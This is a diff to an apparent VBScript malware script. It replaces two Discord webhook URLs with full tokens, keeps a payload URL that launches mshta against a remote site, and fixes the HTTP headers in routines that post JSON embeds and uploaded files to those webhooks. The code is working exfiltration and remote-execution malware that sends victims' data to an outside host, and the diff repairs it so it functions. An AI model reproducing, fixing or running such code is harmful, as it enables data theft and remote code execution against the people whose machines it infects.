@@ -10,8 +10,8 @@ Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' --- WEBHOOKS & PAYLOAD URL ---
-WH = "https://discord.com/api/webhooks/1570916251058966666/qouPqHxayEXljZNieKKMEe8jDCvg4Z-waseJ40ihUhA8YMHIdOMZCgW9MzW0j4lmp5RW"
-RE_WH = "https://discord.com/api/webhooks/1570916369178955906/N3wc8hmVVM4BAxqToDVt1wHRc0h8dj4FXL_iTlWX1V3ATtz8vM0D6GxzIxCvbyJ_fz6N"
+WH = "https://discord.com/api/webhooks/1570885190283427920/MLaG7_qcj28QnQaiyHgm_eaF1p0rj4NUP8ZDh98cFG42MOaHFhhcqsEwzgZsiIpp10Vs"
+RE_WH = "https://discord.com/api/webhooks/1570885290833350747/cnNXdcvYzTDTnUX0tW5ti5d3juq54PPmUl978MgXbWWzF11h_8YMKB-IbV3KnQvPwMPW"
 
 PAYLOAD_URL = "mshta https://dicerigx.app/"
 
@@ -253,7 +253,7 @@ Sub PostEmbedTo(t, d, c, target_wh)
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", target_wh, False
-    h.SetRequestHeader "Content-Type" & DQ & ":" & DQ & "application/json" & DQ
+    h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
     Set h = Nothing
 End Sub
@@ -266,7 +266,7 @@ Sub PostFile(fn, ct)
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type" & DQ & ":" & DQ & "multipart/form-data; boundary=" & b & DQ
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
     h.Send bd
     Set h = Nothing
 End Sub
